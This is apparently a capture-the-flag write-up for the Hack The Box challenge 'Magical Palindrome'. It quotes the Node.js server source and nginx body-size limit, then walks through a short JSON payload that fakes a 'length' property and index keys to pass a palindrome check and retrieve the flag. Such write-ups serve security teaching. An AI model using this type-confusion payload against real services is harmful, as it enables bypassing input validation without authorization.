# HTB Web Challenge: Magical Palindrome

## Challenge Overview

The **Magical Palindrome** challenge presents a classic paradox:

- A Node.js backend expects a **palindrome string of at least 1000 characters**.
- An **Nginx reverse proxy** limits the request body size to **only 75 bytes**.

This makes a legitimate request impossible – unless we find a way to bypass both constraints simultaneously.

## Reconnaissance

After downloading the challenge source, the file structure is: 

```javascript
import {serve} from '@hono/node-server';
import {serveStatic} from '@hono/node-server/serve-static';
import {Hono} from 'hono';
import {readFileSync} from 'fs';

const flag = readFileSync('/flag.txt', 'utf8').trim();

const IsPalinDrome = (string) => {
        if (string.length < 1000) {
                return 'Tootus Shortus';
        }

        for (const i of Array(string.length).keys()) {
                const original = string[i];
                const reverse = string[string.length - i - 1];

                if (original !== reverse || typeof original !== 'string') {
                        return 'Notter Palindromer!!';
                }
        }

        return null;
}

const app = new Hono();

app.get('/', serveStatic({root: '.'}));

app.post('/', async (c) => {
        const {palindrome} = await c.req.json();
        const error = IsPalinDrome(palindrome);
        if (error) {
                c.status(400);
                return c.text(error);
        }
        return c.text(`Hii Harry!!! ${flag}`);
});

app.port = 3000;

serve(app);        
```

And inside `nginx.conf` we found:
```q
        listen 80;
        server_name 127.0.0.1;
                client_max_body_size 75;

```
This mean that if we send a request > 75 Content-Length we must receive a 413.

The next step is trying to put other values like:
```
{"palindrome" : true}
```
And you must see the error "Notter Palindromer", that means we are passed the first validation.
In javascript we can access to the propierties of a variable, so we can send:
```
{ "palindrome":{"length":"1000"}}
```
Still seeing the "Not palindrome", that's mean we need to bypass other functionality.
At the moment:
- We send a "String" with his Object as a argument for the function and this is treated as Object `.length`
Then we need to modifying in same way the propierties of the our array/string.

```
string[0] = a
string[999] = a
```
We are sending the variable "string" and we can modify his propierties:
```
{ "palindrome" : {"length":"1000", "0" : "a" , "999" : "a" } }
```

GG !!
